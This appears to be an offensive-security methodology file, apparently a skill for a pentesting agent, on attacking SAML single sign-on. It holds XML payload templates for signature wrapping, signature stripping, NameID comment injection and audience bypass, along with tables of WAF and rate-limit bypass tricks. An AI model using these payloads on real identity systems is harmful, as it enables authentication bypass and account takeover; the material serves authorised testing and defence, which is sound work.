---
name: web-11-saml
sequence: web-11
category: auth
domain: web
description: "SAML assertion manipulation: XML signature wrapping (XSW), signature stripping, comment injection in NameID, audience restriction bypass, assertion replay, and IdP confusion. Use when testing SAML-based SSO implementations."
wordlist_ref: "wordlists/web/web-68-oauth-saml-advanced/"
---

# SAML — Web Offensive Methodology

## Quick Workflow

1. Capture SAML assertion (AuthnRequest/Response) via proxy
2. Decode the Base64-encoded XML — identify Issuer, Audience, Conditions, Signature
3. Test XML Signature Wrapping — relocate signed element, keep Signature valid
4. Test signature stripping — remove Signature element entirely
5. Test NameID injection — add `<!-- -->` comment to bypass parser filters
6. Test audience/recipient — modify to accept assertion at different SP

---

## Detection

### Capture SAML Traffic

```
POST /Shibboleth.sso/SAML2/POST HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

SAMLResponse=<base64_encoded_assertion>
```

### Decode Assertion

```bash
echo "<base64>" | base64 -d | xmllint --format -
```

---

## Attack Techniques

### XML Signature Wrapping (XSW)

```xml
<!-- Original: Signature validates <Assertion ID="abc">
<!-- Attack: Duplicate Assertion with attacker data, keep original in another location -->
<SAML:Response>
  <SAML:Assertion ID="evil">  <!-- Attacker-controlled data -->
    <SAML:Subject>admin@target.com</SAML:Subject>
    <SAML:AttributeValue>admin</SAML:AttributeValue>
  </SAML:Assertion>
  <SAML:Assertion ID="abc">   <!-- Original — used only for signature validation -->
    <ds:Signature>...</ds:Signature>
  </SAML:Assertion>
</SAML:Response>
```

### Signature Stripping

```xml
<!-- Remove entire <ds:Signature> element — server may accept unsigned assertion -->
<SAML:Response>
  <SAML:Assertion>
    <SAML:Subject>admin@target.com</SAML:Subject>
  </SAML:Assertion>
</SAML:Response>
```

### NameID Comment Injection

```xml
<!-- If parser strips comments before validation, this bypasses domain check -->
<saml:NameID>admin@target.com<!--evil--></saml:NameID>
```

### Audience Restriction Bypass

```xml
<!-- Modify or remove Audience to reuse assertion on different SP -->
<saml:Conditions>
  <saml:AudienceRestriction>
    <saml:Audience>https://evil-sp.com</saml:Audience>
  </saml:AudienceRestriction>
</saml:Conditions>
```

### Assertion Replay

Submit the same SAMLResponse twice — if accepted, no one-time-use enforcement.

---

## Tools

- **SAML Raider** (Burp Suite extension) — XSW, stripping, replay
- **samlmagic** — automated SAML attack tool
- **Custom**: modify XML, re-base64, resubmit

---





## Hacker Mindset

**XML Signature Wrapping exploits the gap between what's signed and what's processed.** The signature validates the original Assertion. The application processes a different Assertion you inserted. If the parser doesn't verify that the signed element is the processed element, you win.

**Signature stripping works more often than it should.** Remove the `<ds:Signature>` element entirely. Many SAML implementations accept unsigned assertions.



## Chaining & Escalation

### Direct Escalation
This vulnerability can often be escalated directly. Test for RCE, data access, or privilege escalation depending on context.

### Chain with Other Skills
| Partner Vulnerability | Chain Effect |
|----------------------|--------------|
| SSRF | Use SSRF to reach internal services through this vuln |
| XSS | Stolen sessions amplify account-level findings |
| IDOR/BOLA | Find more data to exploit via authorization gaps |

### Amplification
Race conditions, parallel requests, and HTTP/2 single-packet attacks can amplify impact by 10-50x.



## OOB Detection & Blind Confirmation

### Blind Confirmation
Always set up OOB detection before testing. Use:
- **Burp Collaborator** — built into Burp Suite Pro
- **Interactsh** — OOB detection server (https://app.interactsh.com)
- **Canarytokens** for callback detection

### Timing Side-Channel
If OOB is blocked, use time-based detection:
- Inject `sleep(5)` or equivalent
- Compare response times between baseline and injected requests
- 5s+ delay = vulnerability confirmed


## Bypass Techniques

| Filter/Block | Bypass |
|-------------|--------|
| WAF block | Encoding, case variation, comment injection |
| Input sanitization | Double encoding, Unicode, null bytes |
| Rate limiting | X-Forwarded-For rotation, HTTP/2 multiplex |
| Blacklist | Alternative syntax, polyglot payloads |


## Wordlist Invocation

When testing this vulnerability, invoke the wordlist payloads manually:

**Wordlist**: `wordlists/web/web-68-oauth-saml-advanced/`

**Files**:
- `wordlists/web/web-68-oauth-saml-advanced/payloads/open_redirect/` — staged exploit payloads (low → med → high)

**Workflow**:
1. Start with `low` stage payloads — minimal risk probes
2. If signals detected, escalate to `med` stage
3. Use `high` only after confirmation (OOB/time-based where applicable)
4. Always establish a baseline response before running time-based payloads

**Tools**: curl, httpx, Burp Suite, or any HTTP client

## References

- CVE-2025-25291/25292 (GitHub Enterprise SAML bypass)
- CVE-2024-45409 (Ruby SAML kit)
- OWASP SAML Security Cheat Sheet
